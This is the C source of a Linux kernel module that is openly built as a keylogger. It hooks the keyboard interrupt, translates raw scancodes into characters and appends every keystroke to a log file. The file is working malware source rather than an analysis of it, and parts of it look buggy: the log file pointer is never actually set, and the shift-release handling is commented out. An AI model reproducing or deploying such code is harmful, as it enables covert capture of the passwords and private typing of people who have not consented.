#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/module.h>
#include <linux/delay.h>
#include <linux/interrupt.h>
#include <linux/string.h>
#include <linux/fs.h>
#include <linux/slab.h>
#include <linux/fcntl.h>        // O_ACCMODE
#include <linux/miscdevice.h>
#include <linux/moduleparam.h>
#include <asm/segment.h>
#include <asm/uaccess.h>



MODULE_LICENSE("GPL");
MODULE_AUTHOR("Vedha");


static int irq = 1,  dev = 0xaa;
#define KBD_DATA_REG        0x60    // I/O port for keyboard data 
#define KBD_SCANCODE_MASK   0x7f
#define KBD_STATUS_MASK     0x80

#define VFS_WRITE kernel_write



struct file* log_fp=NULL;
loff_t log_offset;
const char *log_path= "/home/remnux/Desktop/keylogger/log.txt";


void file_open(struct file *fp)
{

	fp = filp_open(log_path, O_CREAT | O_WRONLY | O_APPEND | O_LARGEFILE, 0666);
}


int log_write(struct file *fp, unsigned char *data,
		unsigned int size)
{
	mm_segment_t old_fs;
	int ret;

	old_fs = get_fs();
	set_fs(KERNEL_DS);

	ret = kernel_write(fp, data, size, &log_offset);
	/* Increase file offset, preparing for next write operation. */
	log_offset += size;

	set_fs(old_fs);
	return ret;
}

static void create_file(void)
{
char *envp[] = {
				"HOME=/root",
				"TERM=xterm",
				NULL
			};

char *argv[] = {
				"/bin/bash",
				"-c",
				"/usr/bin/touch /home/remnux/Desktop/keylogger/log.txt",
				NULL
			};

printk(KERN_INFO "[-] Gonna create a file\n");
	call_usermodehelper(argv[0],argv,envp,UMH_WAIT_EXEC);
	printk(KERN_INFO "[-] File created  successfully\n");

}

void log_close(struct file *fp)
{
	filp_close(fp, NULL);
}

static void mapping(char x){

static int shift = 0;
char buf[32];
memset(buf, 0, sizeof(buf));

switch(x){

default:
return;

case 1:
strcpy(buf, "(ESC)");
break;

case 2:
strcpy(buf, (shift) ? "!" : "1"); break;

case 3:
strcpy(buf, (shift) ? "@" : "2"); break;

case 4:
			strcpy(buf, (shift) ? "#" : "3"); break;
		
		case 5:
			strcpy(buf, (shift) ? "$" : "4"); break;

		case 6:
			strcpy(buf, (shift) ? "%" : "5"); break;

		case 7:
			strcpy(buf, (shift) ? "^" : "6"); break;

		case 8:
			strcpy(buf, (shift) ? "&" : "7"); break;

		case 9:
			strcpy(buf, (shift) ? "*" : "8"); break;

		case 10:
			strcpy(buf, (shift) ? "(" : "9"); break;

		case 11:
			strcpy(buf, (shift) ? ")" : "0"); break;

		case 12:
			strcpy(buf, (shift) ? "_" : "-"); break;

		case 13:
			strcpy(buf, (shift) ? "+" : "="); break;

		case 14:
			strcpy(buf, "(BACK)"); break;

		case 15:
			strcpy(buf, "(TAB)"); break;

		case 16:
			strcpy(buf, (shift) ? "Q" : "q"); break;

		case 17:
			strcpy(buf, (shift) ? "W" : "w"); break;

		case 18:
			strcpy(buf, (shift) ? "E" : "e"); break;

		case 19:
			strcpy(buf, (shift) ? "R" : "r"); break;

		case 20:
			strcpy(buf, (shift) ? "T" : "t"); break;

		case 21:
			strcpy(buf, (shift) ? "Y" : "y"); break;

		case 22:
			strcpy(buf, (shift) ? "U" : "u"); break;

		case 23:
			strcpy(buf, (shift) ? "I" : "i"); break;

		case 24:
			strcpy(buf, (shift) ? "O" : "o"); break;

		case 25:
			strcpy(buf, (shift) ? "P" : "p"); break;

		case 26:
			strcpy(buf, (shift) ? "{" : "["); break;

		case 27:
			strcpy(buf, (shift) ? "}" : "]"); break;

		case 28:
			strcpy(buf, "(ENTER)"); break;

		case 29:
			strcpy(buf, "(CTRL)"); break;

		case 30:
			strcpy(buf, (shift) ? "A" : "a"); break;

		case 31:
			strcpy(buf, (shift) ? "S" : "s"); break;

		case 32:
			strcpy(buf, (shift) ? "D" : "d"); break;

		case 33:
			strcpy(buf, (shift) ? "F" : "f"); break;
	
		case 34:
			strcpy(buf, (shift) ? "G" : "g"); break;

		case 35:
			strcpy(buf, (shift) ? "H" : "h"); break;

		case 36:
			strcpy(buf, (shift) ? "J" : "j"); break;

		case 37:
			strcpy(buf, (shift) ? "K" : "k"); break;

		case 38:
			strcpy(buf, (shift) ? "L" : "l"); break;
	
		case 39:
			strcpy(buf, (shift) ? ":" : ";"); break;

		case 40:
			strcpy(buf, (shift) ? "\"" : "'"); break;

		case 41:
			strcpy(buf, (shift) ? "~" : "`"); break;

		case 42:
		case 54:
			shift = 1; break;

		//case 170:
		//case 182:
			shift = 0; break;

		case 44:
			strcpy(buf, (shift) ? "Z" : "z"); break;
		
		case 45:
			strcpy(buf, (shift) ? "X" : "x"); break;

		case 46:
			strcpy(buf, (shift) ? "C" : "c"); break;

		case 47:
			strcpy(buf, (shift) ? "V" : "v"); break;
		
		case 48:
			strcpy(buf, (shift) ? "B" : "b"); break;

		case 49:
			strcpy(buf, (shift) ? "N" : "n"); break;

		case 50:
			strcpy(buf, (shift) ? "M" : "m"); break;

		case 51:
			strcpy(buf, (shift) ? "<" : ","); break;

		case 52:
			strcpy(buf, (shift) ? ">" : "."); break;
	
		case 53:
			strcpy(buf, (shift) ? "?" : "/"); break;

		case 56:
			strcpy(buf, "(R-ALT"); break;

/* Space */
		case 55:
		case 57:
		case 58:
		case 59:
		case 60:
		case 61:
		case 62:
		case 63:
		case 64:
		case 65:
		case 66:
		case 67:
		case 68:
		case 70:
		case 71:
		case 72:
			strcpy(buf, " "); break;

		case 83:
			strcpy(buf, "(DEL)"); break;


	}
	printk(KERN_INFO "%s",buf);
	log_write(log_fp, buf, sizeof(buf));

}



static irqreturn_t keyboard_handler(int irq, void *dev)
{
	char scancode;
	scancode = inb(KBD_DATA_REG);
//	printk(KERN_INFO "scancode: %d",scancode);
	mapping(scancode);
        return IRQ_NONE;
}




static int __init keylog_init(void)
{
	printk(KERN_INFO "init: keylogger loaded!!! \n");
	create_file();
	file_open(log_fp);
	if(IS_ERR(log_fp)){
		printk(KERN_INFO "FAILED to open log file.\n");
		return 1;
	}


        return request_irq(irq, keyboard_handler, IRQF_SHARED,"my_keyboard_handler", &dev);
}


static void __exit keylog_exit(void)
{
	log_close(log_fp);
	pr_info("exit: keylogger unloaded!!! \n");
        synchronize_irq(irq); /* synchronize interrupt */
        free_irq(irq, &dev);
}


module_init(keylog_init);
module_exit(keylog_exit);
